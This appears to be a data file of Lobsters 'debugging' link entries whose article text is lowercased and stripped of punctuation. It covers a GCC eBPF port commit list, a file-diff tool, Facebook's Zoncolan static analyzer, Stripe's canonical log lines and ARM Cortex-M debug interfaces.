homejemarchgnusrcgccgitgcctestsuitegccdgdgexp gcc summary expected pass unexpected failure unexpected success expected failure unresolved testcases unsupported test failure running gccdg test due linker error like undefined reference exit standard function available target jose e marchesi update configsub configguess optfunctionsawk fix comparison limit begin end testsuite annotate ctorturecompile test dgrequirestacksize testsuite new require effective target indirectcalls bpf new gcc port bpf new libgcc port bpf gcctarget ebpf testsuite bpf make targetsupportsexp aware ebpf bpf adjust gcc testsuite ebpf limitation bpf manual update ebpf bpf add maintainer ebpf port changelog maintainer configguess configsub configure configureac contribchangelog contribconfiglistmk gccchangelog gcccommonconfigbpfbpfcommonc gccconfiggcc gccconfigbpfbpfhelpersdef gccconfigbpfbpfhelpersh gccconfigbpfbpfoptsh gccconfigbpfbpfprotosh gccconfigbpfbpfc gccconfigbpfbpfh gccconfigbpfbpfmd gccconfigbpfbpfopt gccconfigbpfconstraintsmd gccconfigbpfpredicatesmd gccconfigbpftbpf gccdocextendtexi gccdocinvoketexi gccdocsourcebuildtexi gccoptfunctionsawk gcctestsuitechangelog gcctestsuitegccctorturecompiledfcmpc gcctestsuitegccctorturecompilehicmpc gcctestsuitegccctorturecompilehisetc gcctestsuitegccctorturecompileqicmpc gcctestsuitegccctorturecompileqisetc gcctestsuitegccctorturecompilesfsetc gcctestsuitegccctorturecompilesicmpc gcctestsuitegccctorturecompilesisetc gcctestsuitegccctorturecompileuhicmpc gcctestsuitegccctorturecompileuqicmpc gcctestsuitegccctorturecompileusicmpc gcctestsuitegccctorturecompilebcopyc gcctestsuitegccctorturecompilecallindc gcctestsuitegccctorturecompilecallsvoidc gcctestsuitegccctorturecompilecallsc gcctestsuitegccctorturecompileconsecc gccctorturecompilelimitsfndefnc gcctestsuitegccctorturecompilelllc gcctestsuitegccctorturecompileparmsc gcctestsuitegccctorturecompilepassc gcctestsuitegccctorturecompilepoorc gcctestsuitegccctorturecompileppc gcctestsuitegccctorturecompilepretargc gccctorturecompileregsargsizec gcctestsuitegccctorturecompilesoundc gcctestsuitegccctorturecompilestructretc gcctestsuitegccctorturecompileuuargc gcctestsuitegccdgwframelargerthanc gcctestsuitegccdgbuiltinsconfigh gcctestsuitegcctargetbpfbpfexp gcctestsuitegcctargetbpfbuiltinloadc gcctestsuitegcctargetbpfconstantcallsc gcctestsuitegcctargetbpfdiagfunargsc gcctestsuitegcctargetbpfdiagindcallsc gcctestsuitegcctargetbpfhelperbindc gcctestsuitegcctargetbpfhelperbpfredirectc gcctargetbpfhelpercloneredirectc gcctestsuitegcctargetbpfhelpercsumdiffc gcctestsuitegcctargetbpfhelpercsumupdatec bpfhelpercurrenttaskundercgroupc gcctestsuitegcctargetbpfhelperfiblookupc gcctargetbpfhelpergetcgroupclassidc gcctargetbpfhelpergetcurrentcgroupidc gcctargetbpfhelpergetcurrentcommc gcctargetbpfhelpergetcurrentpidtgidc gcctargetbpfhelpergetcurrenttaskc gcctargetbpfhelpergetcurrentuidgidc gcctargetbpfhelpergethashrecalcc gcctargetbpfhelpergetlistenersockc gcctargetbpfhelpergetlocalstoragec gcctargetbpfhelpergetnumanodeidc gcctargetbpfhelpergetrouterealmc gcctargetbpfhelpergetsmpprocessoridc gcctargetbpfhelpergetsocketcookiec gcctargetbpfhelpergetsocketuidc gcctestsuitegcctargetbpfhelpergetstackc gcctestsuitegcctargetbpfhelpergetstackidc gcctestsuitegcctargetbpfhelpergetsockoptc gcctestsuitegcctargetbpfhelperktimegetnsc gcctargetbpfhelperlwtpushencapc gcctargetbpfhelpermapdeleteelemc gcctargetbpfhelpermaplookupelemc gcctargetbpfhelpermappeekelemc gcctestsuitegcctargetbpfhelpermappopelemc gcctargetbpfhelpermappushelemc gcctargetbpfhelpermapupdateelemc gcctargetbpfhelpermsgapplybytesc gcctargetbpfhelpermsgcorkbytesc gcctestsuitegcctargetbpfhelpermsgpopdatac gcctargetbpfhelpermsgpulldatac gcctargetbpfhelpermsgpushdatac gcctargetbpfhelpermsgredirecthashc gcctargetbpfhelpermsgredirectmapc gcctargetbpfhelperoverridereturnc gcctargetbpfhelperperfeventoutputc gcctargetbpfhelperperfeventreadvaluec gcctargetbpfhelperperfeventreadc gcctargetbpfhelperperfprogreadvaluec gcctargetbpfhelperprobereadstrc gcctestsuitegcctargetbpfhelperprobereadc gcctargetbpfhelperprobewriteuserc gcctestsuitegcctargetbpfhelperrckeydownc gcctargetbpfhelperrcpointerrelc gcctestsuitegcctargetbpfhelperrcrepeatc gcctestsuitegcctargetbpfhelperredirectmapc gcctargetbpfhelpersethashinvalidc gcctestsuitegcctargetbpfhelpersethashc gcctestsuitegcctargetbpfhelpersetsockoptc gcctestsuitegcctargetbpfhelperskfullsockc gcctargetbpfhelpersklookuptcpc gcctargetbpfhelpersklookupupdc gcctargetbpfhelperskredirecthashc gcctargetbpfhelperskredirectmapc gcctestsuitegcctargetbpfhelperskreleasec gcctargetbpfhelperskselectreuseportc gcctargetbpfhelperskstoragedeletec gcctargetbpfhelperskstoragegetc gcctargetbpfhelperskbadjustroomc gcctargetbpfhelperskbcgroupidc gcctargetbpfhelperskbchangeheadc gcctargetbpfhelperskbchangeprotoc gcctargetbpfhelperskbchangetailc gcctargetbpfhelperskbchangetypec gcctargetbpfhelperskbecnsetcec gcctargetbpfhelperskbgettunnelkeyc gcctargetbpfhelperskbgettunneloptc gcctargetbpfhelperskbgetxfrmstatec bpfhelperskbloadbytesrelativec gcctargetbpfhelperskbloadbytesc gcctargetbpfhelperskbpulldatac gcctargetbpfhelperskbsettunnelkeyc gcctargetbpfhelperskbsettunneloptc gcctargetbpfhelperskbstorebytesc gcctargetbpfhelperskbundercgroupc gcctestsuitegcctargetbpfhelperskbvlanpopc gcctargetbpfhelperskbvlanpushc gcctargetbpfhelperskclookuptcpc gcctargetbpfhelpersockhashupdatec gcctargetbpfhelpersockmapupdatec gcctargetbpfhelpersockopscbflagssetc gcctestsuitegcctargetbpfhelperspinlockc gcctestsuitegcctargetbpfhelperspinunlockc gcctestsuitegcctargetbpfhelperstrtolc gcctestsuitegcctargetbpfhelperstrtoulc bpfhelpersysctlgetcurrentvaluec gcctargetbpfhelpersysctlgetnamec gcctargetbpfhelpersysctlgetnewvaluec gcctargetbpfhelpersysctlsetnewvaluec gcctestsuitegcctargetbpfhelpertailcallc gcctargetbpfhelpertcpchecksyncookiec gcctestsuitegcctargetbpfhelpertcpsockc gcctestsuitegcctargetbpfhelpertraceprintkc gcctargetbpfhelperxdpadjustheadc gcctargetbpfhelperxdpadjustmetac gcctargetbpfhelperxdpadjusttailc gcctargetbpfskbancestorcgroupidc gcctestsuitegcctargetbpfsyncfetchandaddc gcctestsuitelibtargetsupportsexp libgccchangelog libgccconfighost libgccconfigbpfcrtis libgccconfigbpfcrtns libgccconfigbpftbpf file changed insertion deletion create mode gcccommonconfigbpfbpfcommonc create mode gccconfigbpfbpfhelpersdef create mode gccconfigbpfbpfhelpersh create mode gccconfigbpfbpfoptsh create mode gccconfigbpfbpfprotosh create mode gccconfigbpfbpfc create mode gccconfigbpfbpfh create mode gccconfigbpfbpfmd create mode gccconfigbpfbpfopt create mode gccconfigbpfconstraintsmd create mode gccconfigbpfpredicatesmd create mode gccconfigbpftbpf create mode gcctestsuitegcctargetbpfbpfexp create mode gcctestsuitegcctargetbpfbuiltinloadc create mode gcctestsuitegcctargetbpfconstantcallsc create mode create mode create mode gcctestsuitegcctargetbpfdiagfunargsc create mode gcctestsuitegcctargetbpfdiagindcallsc create mode gcctestsuitegcctargetbpfhelperbindc create mode gcctestsuitegcctargetbpfhelperbpfredirectc create mode gcctestsuitegcctargetbpfhelpercloneredirectc create mode gcctestsuitegcctargetbpfhelpercsumdiffc create mode gcctestsuitegcctargetbpfhelpercsumupdatec create mode gcctestsuitegcctargetbpfhelpercurrenttaskundercgroupc create mode gcctestsuitegcctargetbpfhelperfiblookupc create mode gcctestsuitegcctargetbpfhelpergetcgroupclassidc create mode gcctestsuitegcctargetbpfhelpergetcurrentcgroupidc create mode gcctestsuitegcctargetbpfhelpergetcurrentcommc create mode gcctestsuitegcctargetbpfhelpergetcurrentpidtgidc create mode gcctestsuitegcctargetbpfhelpergetcurrenttaskc create mode gcctestsuitegcctargetbpfhelpergetcurrentuidgidc create mode gcctestsuitegcctargetbpfhelpergethashrecalcc create mode gcctestsuitegcctargetbpfhelpergetlistenersockc create mode gcctestsuitegcctargetbpfhelpergetlocalstoragec create mode gcctestsuitegcctargetbpfhelpergetnumanodeidc create mode create mode gcctestsuitegcctargetbpfhelpergetrouterealmc create mode gcctestsuitegcctargetbpfhelpergetsmpprocessoridc create mode gcctestsuitegcctargetbpfhelpergetsocketcookiec create mode gcctestsuitegcctargetbpfhelpergetsocketuidc create mode gcctestsuitegcctargetbpfhelpergetstackc create mode gcctestsuitegcctargetbpfhelpergetstackidc create mode gcctestsuitegcctargetbpfhelpergetsockoptc create mode gcctestsuitegcctargetbpfhelperktimegetnsc create mode create mode create mode gcctestsuitegcctargetbpfhelperlwtpushencapc create mode create mode create mode create mode gcctestsuitegcctargetbpfhelpermapdeleteelemc create mode gcctestsuitegcctargetbpfhelpermaplookupelemc create mode gcctestsuitegcctargetbpfhelpermappeekelemc create mode gcctestsuitegcctargetbpfhelpermappopelemc create mode gcctestsuitegcctargetbpfhelpermappushelemc create mode gcctestsuitegcctargetbpfhelpermapupdateelemc create mode gcctestsuitegcctargetbpfhelpermsgapplybytesc create mode gcctestsuitegcctargetbpfhelpermsgcorkbytesc create mode gcctestsuitegcctargetbpfhelpermsgpopdatac create mode gcctestsuitegcctargetbpfhelpermsgpulldatac create mode gcctestsuitegcctargetbpfhelpermsgpushdatac create mode gcctestsuitegcctargetbpfhelpermsgredirecthashc create mode gcctestsuitegcctargetbpfhelpermsgredirectmapc create mode gcctestsuitegcctargetbpfhelperoverridereturnc create mode gcctestsuitegcctargetbpfhelperperfeventoutputc create mode gcctestsuitegcctargetbpfhelperperfeventreadvaluec create mode gcctestsuitegcctargetbpfhelperperfeventreadc create mode gcctestsuitegcctargetbpfhelperperfprogreadvaluec create mode gcctestsuitegcctargetbpfhelperprobereadstrc create mode gcctestsuitegcctargetbpfhelperprobereadc create mode gcctestsuitegcctargetbpfhelperprobewriteuserc create mode gcctestsuitegcctargetbpfhelperrckeydownc create mode gcctestsuitegcctargetbpfhelperrcpointerrelc create mode gcctestsuitegcctargetbpfhelperrcrepeatc create mode gcctestsuitegcctargetbpfhelperredirectmapc create mode gcctestsuitegcctargetbpfhelpersethashinvalidc create mode gcctestsuitegcctargetbpfhelpersethashc create mode gcctestsuitegcctargetbpfhelpersetsockoptc create mode gcctestsuitegcctargetbpfhelperskfullsockc create mode gcctestsuitegcctargetbpfhelpersklookuptcpc create mode gcctestsuitegcctargetbpfhelpersklookupupdc create mode gcctestsuitegcctargetbpfhelperskredirecthashc create mode gcctestsuitegcctargetbpfhelperskredirectmapc create mode gcctestsuitegcctargetbpfhelperskreleasec create mode gcctestsuitegcctargetbpfhelperskselectreuseportc create mode gcctestsuitegcctargetbpfhelperskstoragedeletec create mode gcctestsuitegcctargetbpfhelperskstoragegetc create mode gcctestsuitegcctargetbpfhelperskbadjustroomc create mode gcctestsuitegcctargetbpfhelperskbcgroupidc create mode gcctestsuitegcctargetbpfhelperskbchangeheadc create mode gcctestsuitegcctargetbpfhelperskbchangeprotoc create mode gcctestsuitegcctargetbpfhelperskbchangetailc create mode gcctestsuitegcctargetbpfhelperskbchangetypec create mode gcctestsuitegcctargetbpfhelperskbecnsetcec create mode gcctestsuitegcctargetbpfhelperskbgettunnelkeyc create mode gcctestsuitegcctargetbpfhelperskbgettunneloptc create mode gcctestsuitegcctargetbpfhelperskbgetxfrmstatec create mode gcctestsuitegcctargetbpfhelperskbloadbytesrelativec create mode gcctestsuitegcctargetbpfhelperskbloadbytesc create mode gcctestsuitegcctargetbpfhelperskbpulldatac create mode gcctestsuitegcctargetbpfhelperskbsettunnelkeyc create mode gcctestsuitegcctargetbpfhelperskbsettunneloptc create mode gcctestsuitegcctargetbpfhelperskbstorebytesc create mode gcctestsuitegcctargetbpfhelperskbundercgroupc create mode gcctestsuitegcctargetbpfhelperskbvlanpopc create mode gcctestsuitegcctargetbpfhelperskbvlanpushc create mode gcctestsuitegcctargetbpfhelperskclookuptcpc create mode gcctestsuitegcctargetbpfhelpersockhashupdatec create mode gcctestsuitegcctargetbpfhelpersockmapupdatec create mode gcctestsuitegcctargetbpfhelpersockopscbflagssetc create mode gcctestsuitegcctargetbpfhelperspinlockc create mode gcctestsuitegcctargetbpfhelperspinunlockc create mode gcctestsuitegcctargetbpfhelperstrtolc create mode gcctestsuitegcctargetbpfhelperstrtoulc create mode gcctestsuitegcctargetbpfhelpersysctlgetcurrentvaluec create mode gcctestsuitegcctargetbpfhelpersysctlgetnamec create mode gcctestsuitegcctargetbpfhelpersysctlgetnewvaluec create mode gcctestsuitegcctargetbpfhelpersysctlsetnewvaluec create mode gcctestsuitegcctargetbpfhelpertailcallc create mode gcctestsuitegcctargetbpfhelpertcpchecksyncookiec create mode gcctestsuitegcctargetbpfhelpertcpsockc create mode gcctestsuitegcctargetbpfhelpertraceprintkc create mode gcctestsuitegcctargetbpfhelperxdpadjustheadc create mode gcctestsuitegcctargetbpfhelperxdpadjustmetac create mode gcctestsuitegcctargetbpfhelperxdpadjusttailc create mode gcctestsuitegcctargetbpfskbancestorcgroupidc create mode gcctestsuitegcctargetbpfsyncfetchandaddc create mode libgccconfigbpfcrtis create mode libgccconfigbpfcrtns create mode libgccconfigbpftbpf
158,Lobsters,debugging,Debugging,Open source smart file comparison tool,https://github.com/madushadhanushka/differ,open source smart file comparison tool,differ differ structural comparison supported file type build setup download incase failure,differ smart file comparison tool electron based application compare file two directory additianal nomal file comparison tool also provide support compare two xml property json file change whithout considering structural position online version available differ structural comparison supported file type xml json property build setup install dependency npm install serve hot reload npm run dev build electron app production npm run build lint jsvue component file appsrc npm run lint run webpack production npm run pack download download latest binary distribution relavant platform incase failure please makesure set execution permission linux already set chmod x differ already install electron machine need lib file included zipped folder run application face problem using application please raise issue github issue
161,Lobsters,debugging,Debugging,How Facebook Catches Bugs in Its 100 Million Lines of Code,https://www.wired.com/story/facebook-zoncolan-static-analysis-tool/,facebook catch bug million line code,stellar privacy security track record accidentally stored bug bounty program custombuilt static analysis tool billion line,facebook nt stellar privacy security track record especially given many notable gaffe avoidable billion user gargantuan platform defend easy catch every flaw company million line code four year ago facebook engineer began building customized assessment tool check known type bug fully scan entire codebase engineer catch issue tweak change major new feature go livethe platform dubbed zoncolan static analysis tool map behavior function codebase look potential problem individual branch well interaction various path program people manually review endless code change time impractical large scale static analysis scale extremely well set rule undesirable architecture code behavior automatically scan system class bug see catch forever ideally system flag potential problem give engineer realtime feedback help learn avoid pitfall every time engineer make proposed change codebase zoncolan start running background either report engineer directly flag one security engineer call say pieter hooimeijer security engineering manager facebook run thousand time day found order issue calendar year far valuable identification known exposure however cover everything david kennedy trustedsecstatic analysis tool nt find new type vulnerability catch thing based rule directed follow useful workhorse catching type mistake retroactively pulling set bug single new rule also nowhere near unique facebook static analysis tool widely used security community broader development industry hooimeijer note zoncolan especially effective custombuilt comprehensively map facebook specific code hooimeijer say facebook disclosed march accidentally stored hundred million user password plain text company fed rule bug zoncolan scan codebase similar issue could lurking found four year ago would scramble bunch security engineer start combing code manually looking additional issue hooimeijer say incident instead used zoncolan ensure additional issue code base similar nature case created new rule found similar issue practice inspiration new rule expand zoncolan detection capability come number source within facebook including company bug bounty programzoncolan particularly tailored approach hunting security bug versus general static analysis tool look broad array design performance bug also focus recognizable data flow pattern way cutting false positive typical static analysis still facebook company customize system liking google custombuilt static analysis tool well evaluating company enormous billion line codebase company good software development life cycle source code analyzer ensure weed exposure prior moving production say david kennedy ceo corporate incident response consultancy trustedsec mature organization leverage static code analyzer far valuable identification known exposure however cover everything
163,Lobsters,debugging,Debugging,Bryan Cantrill on tail -f (2013),https://www.youtube.com/watch?v=vm1GJMp0QN4&t=2460,bryan cantrill tail f,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature surge lightningtalks youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature surge lightningtalks youtube
164,Lobsters,debugging,Debugging,Fast and flexible observability with canonical log lines,https://stripe.com/gb/blog/canonical-log-lines,fast flexible observability canonical log line,structured logging structured logging logfmt graphite statsd canonical log line one line per request per service canonical log line canonical link relation implementation middleware beyond warehousing history protocol buffer product leverage developer dashboard developer dashboard sketching canonical logging pipeline kubernetes documentation logging fluentd redis stream flexible lightweight observability view opening,logging one oldest ubiquitous pattern computing key gaining insight problem ranging basic failure test environment tangled problem production common practice across software stack type infrastructure decade although log powerful flexible sheer volume often make impractical extract insight expedient way relevant information spread across many individual log line even powerful log processing system searching right detail slow requires intricate query syntax found using slight augmentation traditional logging immensely useful idea call canonical log line quite simple technique addition normal log trace request also emit one long log line end includes many key characteristic data colocated single informationdense line make query aggregation faster write faster run tool technique deploy help get insight production canonical log line particular proven useful added operational visibility incident response put almost every service used main api one emitted every time webhook sent credit card tokenized pci vault page loaded stripe dashboard structured logging like many place computing logging used extensively apis web service payment api single request might generate log trace look like request started user authenticated rate limiting ran charge created request finished request started user authenticated rate limiting ran charge created request finished structured logging augments practice giving developer easy way annotate line additional data use word structured refer natively structured data format like json often mean log line enhanced appending keyvalue pair sometimes called logfmt even universally added structure make easy developer tag line extra information without awkwardly inject log message enriched form trace might look like request started httpmethodpost user authenticated authtypeapikey rate limiting ran rateallowedtrue charge created permissionsusedaccountwrite teamacquiring request finished request started httpmethodpost user authenticated authtypeapikey rate limiting ran rateallowedtrue charge created permissionsusedaccountwrite teamacquiring request finished added structure also make emitted log machine readable keyvalue convention designed compromise machine human readability make ingestible number different log processing tool many provide ability query production log near realtime example might want know last requested api endpoint could figure using log processing system like splunk builtin query language request started head request started head whether api request recently rate limited rate limiting ran allowedfalse rate limiting ran allowedfalse gather statistic api execute duration last hour request finished stats count duration duration duration request finished stats count duration duration duration practice would much common gather sort simplistic vitals dashboard generated metric system like graphite statsd limitation emitted metric dashboard interpret designed advance pinch often difficult query creative unexpected way logging really shine comparison system flexibility log usually overproducing data extent possible procure anything even information one thought need example could check see api path popular request started stats count httppath request started stats count httppath let say see api producing internal server error could check request duration error get good feel whether likely caused database timeouts request finished stats count duration duration duration request finished stats count duration duration duration sophisticated log processing system tend also support visualizing information much way metric dashboard instead reading raw log trace system graph result adhoc query visualization intuitive interpret make much easier u understand going canonical log line one line per request per service although log offer additional flexibility example still left difficult situation want query information across line trace example notice lot rate limiting occurring api might ask question user rate limited knowing answer help differentiate legitimate rate limiting user making many request accidental rate limiting might occur bug system information whether request rate limited user performed spread across multiple log line make harder query log processing system still collating trace data something like request id querying result involves scanning lot data slower run also requires complex syntax harder human remember time consuming write use canonical log line help address simple idea addition normal log trace request unit work executing also emit one long log line end pull key telemetry one place look something like canonicallogline authtypeapikey httpmethodpost permissionsusedaccountwrite rateallowedtrue teamacquiring canonicallogline authtypeapikey httpmethodpost permissionsusedaccountwrite rateallowedtrue teamacquiring sample show kind information canonical line might contain include http request verb path response status authenticated user related information like authenticated api key password id api key used whether rate limiter allowed request statistic like allotted quota portion remains timing information like total request duration time spent database query number database query issued number object allocated vm call log line canonical authoritative line particular request vein ietf canonical link relation specifies authoritative url canonical line ergonomic feature colocating everything important u make accessible query easy people write even duress production incident underlying logging system need piece together multiple log line query time also cheap computer retrieve aggregate make fast use wide variety information logged provides almost limitless flexibility queried especially valuable discovery phase incident understood something wrong still mystery getting insight rate limiting problem becomes simple canonicallogline rateallowedfalse stats count userid canonicallogline rateallowedfalse stats count userid one user rate limited probably legitimate rate limiting making many request many distinct user good chance bug slightly complex example could visualize performance charge endpoint particular user time also making sure filter error caused user error tend short circuit quickly therefore tell u anything meaningful endpoint normal performance characteristic query might look something like canonicallogline httpmethodpost httpstatus timechart duration duration duration canonicallogline httpmethodpost httpstatus timechart duration duration duration api request duration percentile generated onthefly log data implementation middleware beyond logging pervasive technique canonical log line simple enough idea implementing tends straightforward regardless tech stack use implementation stripe main api take form middleware postrequest step generates log line module execute lifecycle request decorate request environment information intended canonical log line middleware extract finish greatly simplified version look like class canonicallinelogger def call env call core application inner middleware status header body appcall env emit canonical line using response status information embedded request environment logcanonicalline status env return result upstream status header body end end class canonicallinelogger def call env call core application inner middleware status header body appcall env emit canonical line using response status information embedded request environment logcanonicalline status env return result upstream status header body end end year implementation hardened maximize chance canonical log line emitted every request even internal failure unexpected condition occurred line logged ruby ensure block case middleware stack unwound exception thrown somewhere logging statement wrapped beginrescue block problem constructing canonical line never fail request also someone notified immediately case important tool u incident response crucial problem fixed would like flying blind warehousing history problem log data tends verbose mean longterm retention anything cold storage expensive especially considering chance used low along useful operational sense succinctness canonical log line also make convenient medium archiving historical request stripe canonical log line used engineer often introspecting production developed muscle memory around naming particular field long time made effort keep naming inconvenient whole team everyone relearn eventually took step formalized contract codifying protocol buffer along emitting canonical line logging system api also serializes data according contract sends asynchronously kafka topic consumer read topic accumulates line batch stored periodic process ingest presto archive redshift let u easily perform longterm analytics look month worth data practice let u measure almost everything ever want example graph track adoption major go version time api request issued official api library go version usage measured time data aggregated archive canonical log line ingested data warehouse better yet warehousing tool driven sql engineer nonengineers alike aggregate analyze data source code query select datetrunc week created week regexpsubstr languageversion majorminor count distinct user eventscanonicalloglines created currentdate interval month language go group order desc product leverage already formalized schema canonical log line protocol buffer use analytics took step started using data drive part stripe product year ago introduced developer dashboard give user access highlevel metric api integration developer dashboard show number successful api request stripe account data generated canonical log line archived chart produced dashboard also produced canonical log line mapreduce backend crunch archive stored create visualization tailored specific user navigating dashboard analytics tool schema codified protocol buffer definition ensures stable contract broken canonical line still useful even never used power product contain rich trove historical data make excellent primary data source sort use sketching canonical logging pipeline canonical log line wellsuited practically production environment let take brief look specific technology might used implement full pipeline setup server log local disk log sent local collector agent central processing system search analysis kubernetes documentation logging suggests use elasticsearch gcp google stackdriver logging awsbased stack conventional solution cloudwatch three require agent like fluentd handle log transmission server node solution common far processing thriving ecosystem dozen option choose worth setting aside time evaluate choose one work best emitting data warehouse requires custom solution one unusual particularly complex server emit canonical log data stream structure asynchronously keep user operation fast kafka far away preferred stream choice day particularly cheap easy run smallerscale setup something like redis stream fine substitute group consumer cooperatively read stream bulk insert content warehouse like redshift bigquery like log processor many data warehousing solution choose flexible lightweight observability recap key element canonical log line find helpful canonical line one line per request per service collates request key telemetry canonical line quick reference metric extremely flexible easy use emit asynchronously kafka topic ingestion data warehouse useful analytics stable contract provided canonical line even make great fit power userfacing product use produce chart stripe developer dashboard proven lightweight flexible technologyagnostic technique observability easy implement powerful small large organization alike find useful getting visibility production service garner insight analytics even shape product like post join stripe engineering team view opening
165,Lobsters,debugging,Debugging,A Deep Dive into ARM Cortex-M Debug Interfaces,https://interrupt.memfault.com/blog/a-deep-dive-into-arm-cortex-m-debug-interfaces,deep dive arm cortexm debug interface,subscribe arm debugger stack debug access port dap embedded trace macrocell etm dap debug access port dap arm debug interface architecture specification debug port access port debug port access port ap access port ap dp ahbap advanced highperformance bus ahb ahbap ahbap controlstatus word register transfer address register data readwrite register debug port external connection option debug port jtag debug port jtagdp test access port serial wire debug swd port swdp serial wirejtag debug port swjdp debug probe debug probe option future technology device international ftdi multi protocol synchronous serial engine cmsisdap debug access port daplink segger jlink debug probe segger stlink stmicroelectronics desktop software interface debug probe mcuxpresso truestudio wicedstudio ide pyocd cmsisdap stlink openocd ftdi cmsisdap jlink segger jlinkgdbserver texanestlink pemicro gdb server linkserverredlink stlinkgdbserver extending debug probe software rtos awareness gdb remote serial protocol thread control block openocds rtos plugin segger gdb server rtos plugin sdk pyocd rtos plugin segger desktop debugger tracing transaction mpu blog post debug path prepping board flashing app capturing trace saleae csv trace closing github useful reference link,ever issue getting debugger flash code breakpoints seem work hitting weird error stepping code debugger seem flaky confused buzzword used around embedded debugging ie swd v jtag openocd v pyocd v jlinkgdbserver cmsisdap v stlink v jlink etc run issue basic understanding technology stack use helpful working around issue may encounter debug setup article walk hardware software stack enables debugging arm cortexm device demystify actually happening go stepbystep example tracing basic debugger operation end end using logic analyzer like interrupt subscribe get latest post straight mailbox arm debugger stack cortexm implement framework known coresight architecture architecture broken several major component notably subsystem used debug initial silicon validation system bringup known debug access port dap subsystem allows traceability known arm embedded trace macrocell etm used stream data instruction access system running article explore functionality dap debug access port dap implementation arm debug interface architecture specification specification defines set debug port register accessed perform operation chip well pinout mcu need expose external debugger attach quite nice mean reading state memory register etc dap pretty much operation regardless arm mcu used access port debug port used configure transaction read write one access port ap access port expose interface different part mcu requirement ap must expose identification register debugger skip understand type must selectable via debug port common type access port known memap expose interface different memory bus available given arm chip arm cortexm memap typically accessed known ahbap default aps selected found apsel part dp ap select register ahbap advanced highperformance bus ahb bus present arm device interconnects memory peripheral present mcu ahbap expose access bus via several register common register used ahbap controlstatus word register csw used configure rule used performing memory access ahb transfer address register tar used control address accessed data readwrite register drw depending access contains data write read tar extensive detail access register set found arm debug interface specification debug port external connection option dap spec defines three different protocol used expose interface debug port outside world jtag debug port jtagdp based ieee standard test access port tap jtag interface exposed pretty much piece silicon standardized several revision added year debug interface requires mcu expose least pin one optional pin dbgtrstn core protocol operates sequence shift register fairly complex state machine push data get data serial wire debug swd port swdp swd designed reduce number physical pin need exposed mcus small number pin available reducing pin count needed debugging mean gpios free external sensor smaller footprint package used one pin swdio used inputoutput swclk used clocking data sampling swdio performed rising edge clock serial wirejtag debug port swjdp swjdp best world expose interface jtag swd used pin carefully assigned two protocol negotiation take place select protocol use configuration see exposed mcus user chose use either protocol depending need debug probe next step getting computer talk mcu typically another piece hardware often referred interfacing mcu used map swd jtag connection usb protocol talk computer sometimes interface provided via external dongle time via integrated ic development board used designing development board always good idea expose debug pin external header keep option open debug probe option quite interfacing option see depending arm mcu ide development kit using popular future technology device international ftdi ft series chip expose bridge usb raw signal line connected chip also popular exposing uart connection fairly cheap expose usb interface know multi protocol synchronous serial engine mpsse used issuing jtag swd transaction serial protocol cmsisdap standardized protocol interfacing arm debug access port arm maintains open source implementation specification know daplink image flashed interfacing mcu one side connected pin mcu debugged side expose usb connection communicates using usb hid command nice part standard talk jtag swd protocol need implemented computer additionally since almost modern computer support hid additional usb driver needed many development kit come cmsisdap pin compatible mcu available easily reflashed example found lot nxp dev board segger jlink debug probe proprietary crossplatform debug probe bridge usb jtag swd many different form factor available segger also firmware available convert lot debug probe jlink compatible stlink proprietary debug probe maintained stmicroelectronics three iteration hardware latest known desktop software interface debug probe selected debug probe next step choosing software computer use communicate probe numerous option available overwhelming majority software stack available expose gdbserver interface expose gdb remote serial protocol one side talk necessary debug probe protocol interfacing mcu even using eclipse based ide ie nxp mcuxpresso truestudio wicedstudio ide etc debug interface usually leveraging gdbserver behind scene selecting software use item want look board support mcu use internal micro flash many probe also come support programming flash easily load new program mcu gdb server option actual gdb server used usually based debug probe selected common choice pyocd pythonbased open source implementation compatible wth cmsisdap stlink debug probe project maintained arm favorite gdbserver moment want understand arm coresight internals reading code actually great reference open source framework easily extended support variety use case openocd cbased open source gdbserver implementation wide array debug probe project probably support widest array debug probe project available run openocd c interfacelist see including ftdi cmsisdap jlink adapter project date back support wide array part found bit flaky use project year segger jlinkgdbserver proprietary gdbserver distributed binary support impressive amount device find list segger jlink install path jlinkdevicesxml found quite reliable debugging issue thing quite painful fix without able see source texanestlink open source implementation stlink debug probe protocol project independently maintained affiliated st proprietary gdb server used different ides pemicro gdb server nxp linkserverredlink stlinkgdbserver extending debug probe software rtos awareness feature like rtos awareness ability see task currently active mcu run info thread view task list eclipse need implemented gdbserver side gdb client connects server ask server thread list server resolve thread list show stack trace active task rtos awareness implementation wind looking pretty similar gdb remote serial protocol message qsymbol used ask client look address given symbol ie pxcurrenttcb would symbol need look address order implement freertos plugin server look symbol need uncover thread control block tcb task system list gdbserver recover state thread issuing read memory mcu sometimes aid recovery information rtos export special symbol expose offset tcb info ie zephyr conveniently many gdb server option expose apis implementing thread awareness one aware implemented rtos plugins include openocds rtos plugin cbased rtosplugin api segger gdb server rtos plugin sdk request access api also c look way openocd plugin work segger based api extremely similar pyocd rtos plugin api python similarly structured two c based apis segger open flashloader custom flash loader ton mcus day allow one execute code external flash part rarely debug probe software preexisting flash loader custom configuration like segger conveniently api implement custom flash loader way work provide microcode flashed ram initialize read erase write flash part interest segger jlinkgdbserver jump function perform operation external flash implemented convenient tool developing plugins quite challenging code run debugger start failure drop breakpoint look best way debug plugins sprinkle message ram read postmortem desktop debugger piece mentioned stack together make debugger common interface stack gdb cli client would launch running command like armnoneeabigdbpy evalcommand target remote localhost remote port symbol elf eclipse based gui different view use inspect variable see memory vscode plugins interface gdb let hover view variable tracing transaction understand bit software stack play let trace transaction better understand happening end end setup use running blinky demo application mpu blog post saleae logic analyzer debug path end end path debug setup look like following image arm debug interface architecture manual capture path look like inside physical connection case swd path image prepping board board see labeled debug looking schematic easily see pinout attached saleae ground pin wire swdio pin wire swdclk pin saleae logic app enabled pin added swd analyzer flashing app purpose experiment look happening segger jlink invocation used jlinkgdbserver swd device speed manually set speed low value play safe usually want sampling rate least faster maximum frequency measured swdclk running want sample rate least megasamples second greater however faster sample better timing resolution flash device attach gdb server used personal favorite debug client gdb cli armnoneeabigdbpy evalcommand target remote ex mon reset ex load ex mon reset capturing trace saleae let trace read transaction step walk would work type transaction want investigate well let read gcrashconfig variable see happens first need halt gdb running ctrlc start capture within saleae logic app run gdb gdb px gcrashconfig determine address size read need take place inspecting variable gdb gdb p sizeof gcrashconfig gdb p gcrashconfig int gcrashconfig first transaction see wire get decoded saleae follows see abort debug port write good operation run issuing transaction reset state current ap put debugger known state wanted decode transaction without saleae analyzer reference manual provides information needed structure write operation look like saleae csv trace 